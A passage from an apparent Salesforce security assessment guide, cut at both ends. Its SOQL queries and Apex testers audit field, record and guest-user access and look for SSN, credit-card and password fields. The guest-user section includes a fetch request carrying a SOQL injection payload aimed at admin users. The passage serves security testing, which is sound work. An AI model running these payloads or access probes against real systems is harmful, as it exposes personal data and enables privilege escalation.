</span><span id="__span-16-20"><a id="__codelineno-16-20" name="__codelineno-16-20" href="#__codelineno-16-20"></a><span class="w">       </span><span class="n">PermissionsRead</span><span class="p">,</span><span class="w"> </span><span class="n">PermissionsEdit</span>
</span><span id="__span-16-21"><a id="__codelineno-16-21" name="__codelineno-16-21" href="#__codelineno-16-21"></a><span class="k">FROM</span><span class="w"> </span><span class="n">FieldPermissions</span><span class="w"> </span>
</span><span id="__span-16-22"><a id="__codelineno-16-22" name="__codelineno-16-22" href="#__codelineno-16-22"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">Field</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-16-23"><a id="__codelineno-16-23" name="__codelineno-16-23" href="#__codelineno-16-23"></a><span class="w">    </span><span class="k">SELECT</span><span class="w"> </span><span class="n">QualifiedApiName</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">FieldDefinition</span><span class="w"> </span>
</span><span id="__span-16-24"><a id="__codelineno-16-24" name="__codelineno-16-24" href="#__codelineno-16-24"></a><span class="w">    </span><span class="k">WHERE</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%SSN%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Credit%&#39;</span><span class="w"> </span>
</span><span id="__span-16-25"><a id="__codelineno-16-25" name="__codelineno-16-25" href="#__codelineno-16-25"></a><span class="w">       </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Password%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Salary%&#39;</span>
</span><span id="__span-16-26"><a id="__codelineno-16-26" name="__codelineno-16-26" href="#__codelineno-16-26"></a><span class="p">)</span>
</span><span id="__span-16-27"><a id="__codelineno-16-27" name="__codelineno-16-27" href="#__codelineno-16-27"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">Field</span><span class="p">,</span><span class="w"> </span><span class="n">Parent</span><span class="p">.</span><span class="n">Name</span>
</span></code></pre></div></p>
<p><strong>Field Access Testing</strong>:
<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>// Apex script to test field accessibility
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>public class FieldSecurityTester {
</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>    public static void testFieldAccess(String objectName, String fieldName) {
</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>        Schema.SObjectType objectType = Schema.getGlobalDescribe().get(objectName);
</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>        Schema.DescribeSObjectResult objectDescribe = objectType.getDescribe();
</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>        Schema.SObjectField field = objectDescribe.fields.getMap().get(fieldName);
</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>
</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>        if (field != null) {
</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>            Schema.DescribeFieldResult fieldDescribe = field.getDescribe();
</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a>            System.debug(&#39;Field: &#39; + fieldName);
</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>            System.debug(&#39;Accessible: &#39; + fieldDescribe.isAccessible());
</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>            System.debug(&#39;Updateable: &#39; + fieldDescribe.isUpdateable());
</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a>            System.debug(&#39;Createable: &#39; + fieldDescribe.isCreateable());
</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a>
</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>            // Test actual data access
</span><span id="__span-17-16"><a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a>            try {
</span><span id="__span-17-17"><a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a>                String query = &#39;SELECT Id, &#39; + fieldName + &#39; FROM &#39; + objectName + &#39; LIMIT 1&#39;;
</span><span id="__span-17-18"><a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a>                List&lt;SObject&gt; records = Database.query(query);
</span><span id="__span-17-19"><a id="__codelineno-17-19" name="__codelineno-17-19" href="#__codelineno-17-19"></a>                System.debug(&#39;Query successful - field accessible&#39;);
</span><span id="__span-17-20"><a id="__codelineno-17-20" name="__codelineno-17-20" href="#__codelineno-17-20"></a>            } catch (Exception e) {
</span><span id="__span-17-21"><a id="__codelineno-17-21" name="__codelineno-17-21" href="#__codelineno-17-21"></a>                System.debug(&#39;Query failed: &#39; + e.getMessage());
</span><span id="__span-17-22"><a id="__codelineno-17-22" name="__codelineno-17-22" href="#__codelineno-17-22"></a>            }
</span><span id="__span-17-23"><a id="__codelineno-17-23" name="__codelineno-17-23" href="#__codelineno-17-23"></a>        }
</span><span id="__span-17-24"><a id="__codelineno-17-24" name="__codelineno-17-24" href="#__codelineno-17-24"></a>    }
</span><span id="__span-17-25"><a id="__codelineno-17-25" name="__codelineno-17-25" href="#__codelineno-17-25"></a>}
</span></code></pre></div></p>
<p><strong>Impact</strong>: Unauthorized access to sensitive field data, PII exposure, compliance violations.</p>
<h3 id="3-record-level-security-analysis">3. Record-Level Security Analysis</h3>
<p><strong>Objective</strong>: Evaluate sharing model security and identify unauthorized record access.</p>
<p><strong>Organization-Wide Defaults Assessment</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1">-- Organization-wide default settings</span>
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">SobjectType</span><span class="p">,</span><span class="w"> </span><span class="n">DefaultInternal</span><span class="p">,</span><span class="w"> </span><span class="n">DefaultExternal</span><span class="p">,</span>
</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="w">       </span><span class="n">DefaultCaseOwnerId</span><span class="p">,</span><span class="w"> </span><span class="n">DefaultOpportunityOwnerId</span>
</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="k">FROM</span><span class="w"> </span><span class="n">OrganizationWideDefault</span><span class="w"> </span>
</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">DefaultInternal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Public&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">DefaultExternal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Public&#39;</span>
</span></code></pre></div></p>
<p><strong>Sharing Rules Analysis</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1">-- Account sharing rules</span>
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">AccountAccessLevel</span><span class="p">,</span><span class="w"> </span><span class="n">CaseAccessLevel</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="w">       </span><span class="n">ContactAccessLevel</span><span class="p">,</span><span class="w"> </span><span class="n">OpportunityAccessLevel</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="w">       </span><span class="n">AccessMapping</span><span class="p">,</span><span class="w"> </span><span class="n">Description</span><span class="p">,</span><span class="w"> </span><span class="n">SharedToType</span>
</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="k">FROM</span><span class="w"> </span><span class="n">AccountSharingRule</span><span class="w"> </span>
</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">AccountAccessLevel</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;Edit&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;All&#39;</span><span class="p">)</span>
</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>
</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a><span class="c1">-- Custom object sharing rules  </span>
</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">AccessLevel</span><span class="p">,</span><span class="w"> </span><span class="n">SobjectType</span><span class="p">,</span><span class="w"> </span><span class="n">Description</span><span class="p">,</span>
</span><span id="__span-19-10"><a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a><span class="w">       </span><span class="n">SharedToType</span><span class="p">,</span><span class="w"> </span><span class="n">SharedTo</span>
</span><span id="__span-19-11"><a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a><span class="k">FROM</span><span class="w"> </span><span class="n">CustomObjectSharingRule</span><span class="w"> </span>
</span><span id="__span-19-12"><a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">AccessLevel</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;Edit&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;All&#39;</span><span class="p">)</span>
</span><span id="__span-19-13"><a id="__codelineno-19-13" name="__codelineno-19-13" href="#__codelineno-19-13"></a>
</span><span id="__span-19-14"><a id="__codelineno-19-14" name="__codelineno-19-14" href="#__codelineno-19-14"></a><span class="c1">-- Manual sharing analysis</span>
</span><span id="__span-19-15"><a id="__codelineno-19-15" name="__codelineno-19-15" href="#__codelineno-19-15"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">UserOrGroupId</span><span class="p">,</span><span class="w"> </span><span class="n">AccountId</span><span class="p">,</span><span class="w"> </span><span class="n">AccountAccessLevel</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-19-16"><a id="__codelineno-19-16" name="__codelineno-19-16" href="#__codelineno-19-16"></a><span class="w">       </span><span class="n">RowCause</span><span class="p">,</span><span class="w"> </span><span class="n">IsDeleted</span><span class="p">,</span><span class="w"> </span><span class="n">LastModifiedDate</span><span class="p">,</span><span class="w"> </span><span class="n">LastModifiedBy</span><span class="p">.</span><span class="n">Name</span>
</span><span id="__span-19-17"><a id="__codelineno-19-17" name="__codelineno-19-17" href="#__codelineno-19-17"></a><span class="k">FROM</span><span class="w"> </span><span class="n">AccountShare</span><span class="w"> </span>
</span><span id="__span-19-18"><a id="__codelineno-19-18" name="__codelineno-19-18" href="#__codelineno-19-18"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">RowCause</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Manual&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">AccountAccessLevel</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;Edit&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;All&#39;</span><span class="p">)</span>
</span><span id="__span-19-19"><a id="__codelineno-19-19" name="__codelineno-19-19" href="#__codelineno-19-19"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">LastModifiedDate</span><span class="w"> </span><span class="k">DESC</span>
</span></code></pre></div></p>
<p><strong>Record Access Testing</strong>:
<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>// Test record accessibility across different user contexts
</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>public class RecordAccessTester {
</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>    public static void testRecordAccess(Id recordId, Id userId) {
</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>        System.runAs(new User(Id = userId)) {
</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>            try {
</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>                String objectType = recordId.getSObjectType().getDescribe().getName();
</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a>                String query = &#39;SELECT Id, Name FROM &#39; + objectType + &#39; WHERE Id = :recordId&#39;;
</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>                List&lt;SObject&gt; records = Database.query(query);
</span><span id="__span-20-9"><a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a>
</span><span id="__span-20-10"><a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a>                if (!records.isEmpty()) {
</span><span id="__span-20-11"><a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a>                    System.debug(&#39;Record accessible to user: &#39; + userId);
</span><span id="__span-20-12"><a id="__codelineno-20-12" name="__codelineno-20-12" href="#__codelineno-20-12"></a>
</span><span id="__span-20-13"><a id="__codelineno-20-13" name="__codelineno-20-13" href="#__codelineno-20-13"></a>                    // Test edit access
</span><span id="__span-20-14"><a id="__codelineno-20-14" name="__codelineno-20-14" href="#__codelineno-20-14"></a>                    SObject record = records[0];
</span><span id="__span-20-15"><a id="__codelineno-20-15" name="__codelineno-20-15" href="#__codelineno-20-15"></a>                    try {
</span><span id="__span-20-16"><a id="__codelineno-20-16" name="__codelineno-20-16" href="#__codelineno-20-16"></a>                        update record;
</span><span id="__span-20-17"><a id="__codelineno-20-17" name="__codelineno-20-17" href="#__codelineno-20-17"></a>                        System.debug(&#39;Record editable by user: &#39; + userId);
</span><span id="__span-20-18"><a id="__codelineno-20-18" name="__codelineno-20-18" href="#__codelineno-20-18"></a>                    } catch (DmlException e) {
</span><span id="__span-20-19"><a id="__codelineno-20-19" name="__codelineno-20-19" href="#__codelineno-20-19"></a>                        System.debug(&#39;Record not editable: &#39; + e.getMessage());
</span><span id="__span-20-20"><a id="__codelineno-20-20" name="__codelineno-20-20" href="#__codelineno-20-20"></a>                    }
</span><span id="__span-20-21"><a id="__codelineno-20-21" name="__codelineno-20-21" href="#__codelineno-20-21"></a>                }
</span><span id="__span-20-22"><a id="__codelineno-20-22" name="__codelineno-20-22" href="#__codelineno-20-22"></a>            } catch (QueryException e) {
</span><span id="__span-20-23"><a id="__codelineno-20-23" name="__codelineno-20-23" href="#__codelineno-20-23"></a>                System.debug(&#39;Record not accessible: &#39; + e.getMessage());
</span><span id="__span-20-24"><a id="__codelineno-20-24" name="__codelineno-20-24" href="#__codelineno-20-24"></a>            }
</span><span id="__span-20-25"><a id="__codelineno-20-25" name="__codelineno-20-25" href="#__codelineno-20-25"></a>        }
</span><span id="__span-20-26"><a id="__codelineno-20-26" name="__codelineno-20-26" href="#__codelineno-20-26"></a>    }
</span><span id="__span-20-27"><a id="__codelineno-20-27" name="__codelineno-20-27" href="#__codelineno-20-27"></a>}
</span></code></pre></div></p>
<p><strong>Impact</strong>: Horizontal privilege escalation, unauthorized access to sensitive records.</p>
<h3 id="4-guest-user-security-assessment">4. Guest User Security Assessment</h3>
<p><strong>Objective</strong>: Evaluate guest user security and identify potential abuse vectors.</p>
<p><strong>Guest User Configuration Analysis</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c1">-- Guest user profiles and permissions</span>
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">UserType</span><span class="p">,</span><span class="w"> </span><span class="n">PermissionsApiEnabled</span><span class="p">,</span><span class="w"> </span><span class="n">PermissionsRunReports</span><span class="p">,</span>
</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="w">       </span><span class="n">PermissionsViewSetup</span><span class="p">,</span><span class="w"> </span><span class="n">PermissionsModifyAllData</span><span class="p">,</span><span class="w"> </span><span class="n">PermissionsViewAllData</span>
</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="k">FROM</span><span class="w"> </span><span class="n">Profile</span><span class="w"> </span>
</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">Name</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Guest%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">UserType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Guest&#39;</span>
</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>
</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="c1">-- Site guest user settings</span>
</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">Status</span><span class="p">,</span><span class="w"> </span><span class="n">AdminId</span><span class="p">,</span><span class="w"> </span><span class="n">GuestUserId</span><span class="p">,</span><span class="w"> </span><span class="n">AnalyticsTrackingCode</span><span class="p">,</span>
</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a><span class="w">       </span><span class="n">ClickjackProtectionLevel</span><span class="p">,</span><span class="w"> </span><span class="n">GuestUserProfile</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span>
</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a><span class="w">       </span><span class="n">GuestUserProfile</span><span class="p">.</span><span class="n">PermissionsApiEnabled</span>
</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a><span class="k">FROM</span><span class="w"> </span><span class="n">Site</span><span class="w"> </span>
</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Active&#39;</span>
</span><span id="__span-21-13"><a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a>
</span><span id="__span-21-14"><a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a><span class="c1">-- Guest user record access via OWD</span>
</span><span id="__span-21-15"><a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">SobjectType</span><span class="p">,</span><span class="w"> </span><span class="n">DefaultExternal</span>
</span><span id="__span-21-16"><a id="__codelineno-21-16" name="__codelineno-21-16" href="#__codelineno-21-16"></a><span class="k">FROM</span><span class="w"> </span><span class="n">OrganizationWideDefault</span><span class="w"> </span>
</span><span id="__span-21-17"><a id="__codelineno-21-17" name="__codelineno-21-17" href="#__codelineno-21-17"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">DefaultExternal</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;Public&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;PublicReadOnly&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;PublicReadWrite&#39;</span><span class="p">)</span>
</span></code></pre></div></p>
<p><strong>Guest User Exploitation Testing</strong>:
<div class="language-javascript highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="c1">// Guest user API access testing (unauthenticated context)</span>
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/services/data/v52.0/sobjects/&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;GET&#39;</span><span class="p">,</span>
</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;application/json&#39;</span><span class="w"> </span><span class="p">}</span>
</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">ok</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Guest API access available&#39;</span><span class="p">);</span>
</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">();</span>
</span><span id="__span-22-9"><a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-22-10"><a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a><span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-22-11"><a id="__codelineno-22-11" name="__codelineno-22-11" href="#__codelineno-22-11"></a><span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Available objects:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">);</span>
</span><span id="__span-22-12"><a id="__codelineno-22-12" name="__codelineno-22-12" href="#__codelineno-22-12"></a><span class="p">});</span>
</span><span id="__span-22-13"><a id="__codelineno-22-13" name="__codelineno-22-13" href="#__codelineno-22-13"></a>
</span><span id="__span-22-14"><a id="__codelineno-22-14" name="__codelineno-22-14" href="#__codelineno-22-14"></a><span class="c1">// Test guest user SOQL injection</span>
</span><span id="__span-22-15"><a id="__codelineno-22-15" name="__codelineno-22-15" href="#__codelineno-22-15"></a><span class="kd">const</span><span class="w"> </span><span class="nx">maliciousQuery</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&#39; UNION SELECT Id, Name FROM User WHERE Profile.Name LIKE &#39;%Admin%&#39;--&quot;</span><span class="p">;</span>
</span><span id="__span-22-16"><a id="__codelineno-22-16" name="__codelineno-22-16" href="#__codelineno-22-16"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/services/data/v52.0/query/?q=SELECT Id FROM Account WHERE Name = \&#39;&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">maliciousQuery</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-22-17"><a id="__codelineno-22-17" name="__codelineno-22-17" href="#__codelineno-22-17"></a><span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;GET&#39;</span>
</span><span id="__span-22-18"><a id="__codelineno-22-18" name="__codelineno-22-18" href="#__codelineno-22-18"></a><span class="p">});</span>
</span></code></pre></div></p>
<p><strong>Impact</strong>: Unauthenticated data access, potential for public data exposure.</p>
<hr />
<h2 id="data-security-evaluation">Data Security Evaluation</h2>
<h3 id="1-sensitive-data-discovery-classification">1. Sensitive Data Discovery &amp; Classification</h3>
<p><strong>Objective</strong>: Identify, catalog, and assess protection of sensitive data.</p>
<p><strong>Comprehensive Data Discovery</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="c1">-- PII and sensitive data identification</span>
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">EntityDefinition</span><span class="p">.</span><span class="n">QualifiedApiName</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">ObjectName</span><span class="p">,</span>
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="w">       </span><span class="n">QualifiedApiName</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">FieldName</span><span class="p">,</span><span class="w"> </span><span class="n">Label</span><span class="p">,</span><span class="w"> </span><span class="n">DataType</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="w">       </span><span class="n">IsEncrypted</span><span class="p">,</span><span class="w"> </span><span class="n">SecurityClassification</span><span class="p">,</span><span class="w"> </span><span class="n">ComplianceGroup</span><span class="p">,</span>
</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="w">       </span><span class="n">IsCalculated</span><span class="p">,</span><span class="w"> </span><span class="n">IsCompound</span>
</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="k">FROM</span><span class="w"> </span><span class="n">FieldDefinition</span><span class="w"> </span>
</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a><span class="k">WHERE</span><span class="w"> </span><span class="p">(</span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%SSN%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Social Security%&#39;</span><span class="w"> </span>
</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a><span class="w">    </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Tax%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Credit Card%&#39;</span><span class="w"> </span>
